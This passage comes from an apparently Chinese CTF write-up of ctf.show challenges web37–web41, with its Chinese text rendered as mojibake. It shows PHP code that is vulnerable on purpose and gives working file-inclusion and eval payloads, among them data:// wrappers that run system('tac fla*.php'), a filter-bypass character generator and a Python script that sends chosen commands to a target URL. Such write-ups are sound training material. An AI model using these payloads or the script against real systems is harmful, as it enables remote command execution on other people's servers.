</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¸æ˜¯å“¥ä»¬ï¼Œæ€ä¹ˆè¿˜æ˜¯æ–‡ä»¶åŒ…å«</p>
<p>payloadï¼š</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p>
<p>æˆ–è€…</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web38">web38<a hidden class="anchor" aria-hidden="true" href="#web38">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:23:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|php|file/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<blockquote>
<p>?c=data://text/plain,<?=system("tac%20fla*")?></p>
<p>æˆ–è€…</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web39">web39<a hidden class="anchor" aria-hidden="true" href="#web39">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:13:21
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é‡Œä¼šåœ¨æˆ‘ä»¬ä¼ å…¥çš„cåé¢æ‹¼æ¥ä¸€æ®µ.php</p>
<p>æˆ‘ä»¬åªéœ€è¦åœ¨åŠ å…¥<?php ?>é‚£ä¹ˆphpå°±åªä¼šæ‰§è¡Œä¸­é—´çš„ä»£ç ï¼Œåé¢çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ</p>
<p>æ•…payloadï¼š</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p></blockquote>
<h4 id="web40">web40<a hidden class="anchor" aria-hidden="true" href="#web40">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:03:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½å…³é”®è¯ /[0-9]|~|`|@|#|\$|%|^|&amp;|*|\ï¼ˆ|\ï¼‰|-|=|+|{|[|]|}|:|'|&quot;|,|&lt;|.|&gt;|/|?|\\</p>
<p>è¿™é‡Œè¦ä½¿ç”¨æ— å‚å‘½ä»¤æ‰§è¡Œ</p>
<p>payloadï¼š</p>
<blockquote>
<p>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote>
<p>å…³äºæ— å‚å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›è§£é‡Š</p>
<p><img alt="image-20241109165447576" loading="lazy" src="assets/202411091654772.png"></p>
<h4 id="web41">web41<a hidden class="anchor" aria-hidden="true" href="#web41">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: ç¾½
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:31:22
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:40:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: 1341963450@qq.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctf.show
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo(</span><span class="si">$c</span><span class="s2">);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿‡æ»¤å†…å®¹ï¼š<code>/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i</code></p>
<p>è¿™ä¸ªé¢˜è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–<a href="https://so.csdn.net/so/search?q=%e8%bf%90%e7%ae%97%e7%ac%a6&amp;spm=1001.2101.3001.7020">è¿ç®—ç¬¦</a><code>|</code>ã€‚
æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚</p>
<p>å¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  
</span></span><span class="line"><span class="ln">24</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">|</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;php rce_or.php&#34;</span><span class="p">)</span>  <span class="c1">#æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;USERï¼špython exp.py &lt;url&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;egï¼š  python exp.py http://ctf.show/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">url</span><span class="o">=</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">               <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">   
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your functionï¼š&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your commandï¼š&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">   <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">       <span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">   <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] result:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
